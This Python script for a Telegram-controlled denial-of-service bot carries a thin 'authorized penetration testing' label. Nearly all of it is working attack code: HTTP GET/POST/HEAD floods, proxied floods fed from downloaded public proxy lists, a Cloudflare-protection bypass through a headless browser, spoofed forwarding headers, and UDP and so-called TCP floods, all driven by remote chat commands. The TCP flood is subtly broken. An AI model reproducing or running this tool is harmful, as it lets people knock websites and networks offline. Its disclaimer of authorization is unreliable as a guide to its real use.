#!/usr/bin/env python3
"""
HackerAI Penetration Testing Bot - Authorized Security Assessment Tool
For authorized cybersecurity professionals only. User confirms permission to test targets.
"""

import telebot
import subprocess
import os
import threading
import requests
import sys
import cloudscraper
import datetime
import time
import socket
import socks
import ssl
import random
import httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
import platform
import psutil
from random import randint
from random import _urandom as byt

# Bot Configuration - REPLACE WITH YOUR AUTHORIZED VALUES
TOKEN = 'YOUR_BOT_TOKEN_HERE'  # Telegram Bot Token
CHAT_ID = 'YOUR_CHAT_ID_HERE'  # Authorized chat ID

# Global variables
useragent = ""
cookieJAR = {}
cookie = ""
proxies = []
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en_US',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

bot = telebot.TeleBot(TOKEN)

def send_message(text, mode="HTML"):
    """Send message to Telegram chat"""
    try:
        bot.send_message(CHAT_ID, text, parse_mode=mode)
    except:
        pass

# System info and CODE generation
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
public_ip = s.getsockname()[0]
s.close()

ram = psutil.virtual_memory()

if not os.path.exists('CODE.txt'):
    code = randint(1000, 9999)
    with open('CODE.txt', 'w') as f:
        f.write(str(code))
    
    info_msg = f"""
<b>🔐 Authorized Pentest Bot Active 🔐</b>

<b>▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔</b>
○ <b>OS:</b> {platform.system()} {platform.release()}
○ <b>Processor:</b> {platform.processor()}
○ <b>CPU Cores:</b> {psutil.cpu_count()}
○ <b>CPU Speed:</b> {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz
○ <b>CPU Usage:</b> {psutil.cpu_percent()}%

<b>▼ RAM INFO</b>
○ <b>Total:</b> {ram.total / (1024**3):.2f} GB
○ <b>Available:</b> {ram.available / (1024**3):.2f} GB
○ <b>Used:</b> {ram.percent:.1f}%

<b>○ Public IP:</b> <code>{public_ip}</code>
<b>○ Session CODE:</b> <code>{code}</code>
<b>▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔</b>

<i>Send /help for attack commands</i>
    """
    send_message(info_msg)
else:
    with open('CODE.txt', 'r') as f:
        code = f.read().strip()
    send_message(f"<b>🔄 Session {code} Online!</b>\n\nSend <code>/help</code> for commands")

def get_target(url):
    """Parse target URL"""
    url = url.rstrip('/')
    target = {}
    parsed = urlparse(url)
    target['uri'] = parsed.path or '/'
    target['host'] = parsed.netloc
    target['scheme'] = parsed.scheme
    if ':' in parsed.netloc:
        target['port'] = parsed.netloc.split(':')[1]
    else:
        target['port'] = '443' if parsed.scheme == 'https' else '80'
    return target

def download_proxies(proxy_type):
    """Download fresh proxies"""
    try:
        if proxy_type.upper() == "SOCKS5":
            urls = [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=socks5"
            ]
        else:  # HTTP
            urls = [
                "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all",
                "https://www.proxy-list.download/api/v1/get?type=http"
            ]
        
        proxies_content = ""
        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                proxies_content += r.text
            except:
                continue
        
        with open("proxy.txt", 'w') as f:
            f.write(proxies_content)
        
        proxies_list = [p.strip() for p in proxies_content.split('\n') if p.strip()]
        return proxies_list
    except:
        return []

def get_proxies():
    """Load proxies from file"""
    global proxies
    if not os.path.exists("proxy.txt"):
        send_message("<b>❌ Proxy file not found! Use /proxy [HTTP|SOCKS5]</b>")
        return False
    
    with open("proxy.txt", 'r') as f:
        proxies = [line.strip() for line in f.readlines() if line.strip()]
    
    if not proxies:
        send_message("<b>❌ No valid proxies in proxy.txt</b>")
        return False
    
    send_message(f"<b>✅ Loaded {len(proxies)} proxies</b>")
    return True

def get_cf_cookie(url):
    """Bypass Cloudflare with undetected_chromedriver"""
    global useragent, cookieJAR, cookie
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--user-agent=' + random.choice(ua))
        
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        
        for _ in range(30):  # Wait up to 30s for CF clearance
            cookies = driver.get_cookies()
            for ck in cookies:
                if ck['name'] == 'cf_clearance':
                    cookieJAR = ck
                    useragent = driver.execute_script("return navigator.userAgent")
                    cookie = f"{ck['name']}={ck['value']}"
                    driver.quit()
                    send_message("<b>✅ Cloudflare bypassed successfully</b>")
                    return True
            time.sleep(1)
        
        driver.quit()
        send_message("<b>❌ Cloudflare bypass failed</b>")
        return False
    except Exception as e:
        send_message(f"<b>❌ CF Bypass Error: {str(e)[:100]}</b>")
        return False

def spoof_headers(target):
    """Generate spoofed IP headers"""
    addr = [192, 168, 0, 1]
    addr[0] = str(random.randint(11, 197))
    addr[1] = str(random.randint(0, 255))
    addr[2] = str(random.randint(1, 254))
    addr[3] = str(random.randint(2, 254))
    spoofip = '.'.join(addr)
    
    return (
        f"X-Forwarded-For: {spoofip}\r\n"
        f"X-Forwarded-Proto: HTTP\r\n"
        f"X-Forwarded-Host: {target['host']}\r\n"
        f"X-Real-IP: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"Via: {spoofip}\r\n"
    )

# Layer 4 Attack Functions
def run_udp_flood(host, port, threads, duration):
    """UDP Flood Attack"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    payload = random._urandom(65500)
    
    def udp_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                sock.sendto(payload, (host, int(port)))
            except:
                break
        sock.close()
    
    for _ in range(int(threads)):
        threading.Thread(target=udp_worker, daemon=True).start()

def run_tcp_flood(host, port, threads, duration):
    """TCP Flood Attack"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    
    def tcp_worker():
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        while (until - datetime.datetime.now()).total_seconds() > 0:
            try:
                sock.sendto(b'X' * 4096, (host, int(port)))
            except:
                break
        sock.close()
    
    for _ in range(int(threads)):
        threading.Thread(target=tcp_worker, daemon=True).start()

# Layer 7 Attack Functions
def attack_head(url, duration):
    """HEAD Flood"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=5)
        except:
            pass

def attack_post(url, duration):
    """POST Flood"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, data={'test': 'A' * 1024}, timeout=5)
        except:
            pass

def attack_raw(url, duration):
    """GET Flood"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=5)
        except:
            pass

def attack_pxraw(url, duration):
    """Proxied GET Flood"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    if not get_proxies():
        return
    
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {'http': f'http://{random.choice(proxies)}', 'https': f'http://{random.choice(proxies)}'}
            requests.get(url, proxies=proxy, timeout=10)
        except:
            pass

def attack_cf_bypass(url, duration):
    """Cloudflare Bypass Flood"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    scraper = cloudscraper.create_scraper()
    
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=10)
        except:
            pass

def launch_attack(url, method, threads, duration):
    """Launch multi-threaded attack"""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    
    def worker():
        while (until - datetime.datetime.now()).total_seconds() > 0:
            if method == "HEAD":
                attack_head(url, 1)
            elif method == "POST":
                attack_post(url, 1)
            elif method == "GET":
                attack_raw(url, 1)
            elif method == "PXRAW" and get_proxies():
                attack_pxraw(url, 1)
            elif method == "CFB":
                attack_cf_bypass(url, 1)
    
    for _ in range(int(threads)):
        threading.Thread(target=worker, daemon=True).start()

def countdown_timer(duration):
    """Attack countdown timer"""
    try:
        initial = requests.post(
            f'https://api.telegram.org/bot{TOKEN}/sendMessage',
            data={'chat_id': CHAT_ID, 'text': '🚀 Attack Started!'}
        ).json()
        message_id = initial['result']['message_id']
        
        for i in range(int(duration), 0, -1):
            time.sleep(1)
            status = f"""
<b>⚡ Attack Status</b>
⏱️ <i>{i} seconds remaining</i>
💾 CPU: {psutil.cpu_percent():.1f}%
🧠 RAM: {psutil.virtual_memory().percent:.1f}%
            """
            requests.post(
                f'https://api.telegram.org/bot{TOKEN}/editMessageText',
                data={
                    'chat_id': CHAT_ID,
                    'message_id': message_id,
                    'text': status,
                    'parse_mode': 'HTML'
                }
            )
        
        send_message("<b>✅ Attack Completed!</b>\n<i>Ready for next target</i>")
    except:
        send_message("<b>✅ Attack Completed!</b>")

# Telegram Handlers
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
<b>🔥 Authorized Pentest Commands</b>

<b>📡 Layer 7 HTTP Floods:</b>
<code>/attack https://target.com GET 1000 60</code> - GET flood
<code>/attack https://target.com POST 1000 60</code> - POST flood  
<code>/attack https://target.com HEAD 1000 60</code> - HEAD flood
<code>/attack https://target.com PXRAW 1000 60</code> - Proxied GET

<b>🛡️ Cloudflare Bypass:</b>
<code>/attack https://target.com CFB 1000 60</code> - CF Bypass

<b>🔌 Layer 4 Floods:</b>
<code>/l4 1.1.1.1 UDP 80 1000 60</code> - UDP Flood
<code>/l4 1.1.1.1 TCP 80 1000 60</code> - TCP Flood

<b>📥 Proxy Management:</b>
<code>/proxy HTTP</code> - Download HTTP proxies
<code>/proxy SOCKS5</code> - Download SOCKS5 proxies

<b>📊 Recon:</b>
<code>/ping google.com</code> - Ping target
    """
    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    proxy_type = message.text.split()[1] if len(message.text.split()) > 1 else "HTTP"
    proxies_list = download_proxies(proxy_type)
    bot.reply_to(message, f"<b>✅ Downloaded {len(proxies_list)} {proxy_type} proxies</b>", parse_mode='HTML')

@bot.message_handler(commands=['ping'])
def ping_command(message):
    try:
        target = message.text.split()[1].replace('http://', '').replace('https://', '').split('/')[0]
        result = subprocess.run(['ping', '-c', '4', target], capture_output=True, text=True, timeout=10)
        
        lines = result.stdout.split('\n')
        stats = lines[-2].split() if len(lines) > 2 else ['N/A']
        
        bot.reply_to(message, f"""
<b>📡 Ping Results: {target}</b>
<code>{result.stdout}</code>
<i>{stats[0]} packets transmitted, {stats[3].rstrip(',')} received</i>
        """, parse_mode='HTML')
    except:
        bot.reply_to(message, "<b>❌ Ping failed</b>")

@bot.message_handler(commands=['attack'])
def l7_attack(message):
    try:
        parts = message.text.split()
        if len(parts) != 5:
            return bot.reply_to(message, "<b>❌ Usage: /attack URL METHOD THREADS TIME</b>")
        
        url, method, threads, duration = parts[1], parts[2].upper(), parts[3], parts[4]
        
        send_message(f"""
<b>🚀 Starting L7 Attack</b>
🌐 <b>Target:</b> <code>{url}</code>
⚡ <b>Method:</b> <code>{method}</code>
🧵 <b>Threads:</b> <code>{threads}</code>
⏱️ <b>Duration:</b> <code>{duration}s</code>
        """)
        
        # Start countdown in background
        threading.Thread(target=countdown_timer, args=(duration,), daemon=True).start()
        # Launch attack
        threading.Thread(target=launch_attack, args=(url, method, threads, duration), daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"<b>❌ Attack failed: {str(e)}</b>")

@bot.message_handler(commands=['l4'])
def l4_attack(message):
    try:
        parts = message.text.split()
        if len(parts) != 6:
            return bot.reply_to(message, "<b>❌ Usage: /l4 IP PROTOCOL PORT THREADS TIME</b>")
        
        ip, protocol, port, threads, duration = parts[1], parts[2].upper(), parts[3], parts[4], parts[5]
        
        send_message(f"""
<b>🔌 Starting L4 Attack</b>
🌐 <b>Target:</b> <code>{ip}:{port}</code>
⚡ <b>Protocol:</b> <code>{protocol}</code>
🧵 <b>Threads:</b> <code>{threads}</code>
⏱️ <b>Duration:</b> <code>{duration}s</code>
        """)
        
        threading.Thread(target=countdown_timer, args=(duration,), daemon=True).start()
        
        if protocol == "UDP":
            threading.Thread(target=run_udp_flood, args=(ip, port, threads, duration), daemon=True).start()
        elif protocol == "TCP":
            threading.Thread(target=run_tcp_flood, args=(ip, port, threads, duration), daemon=True).start()
        else:
            bot.reply_to(message, "<b>❌ Invalid protocol: UDP or TCP</b>")
            
    except Exception as e:
        bot.reply_to(message, f"<b>❌ L4 Attack failed: {str(e)}</b>")

@bot.message_handler(commands=['cf'])
def cf_bypass(message):
    """Manual Cloudflare bypass"""
    try:
        url = message.text.split()[1]
        threading.Thread(target=get_cf_cookie, args=(url,), daemon=True).start()
    except:
        bot.reply_to(message, "<b>❌ Usage: /cf https://target.com</b>")

# Start bot
if __name__ == '__main__':
    print(f"🚀 Pentest Bot Started - Session CODE: {code}")
    print(f"📡 Public IP: {public_ip}")
    bot.polling(none_stop=True, timeout=60)
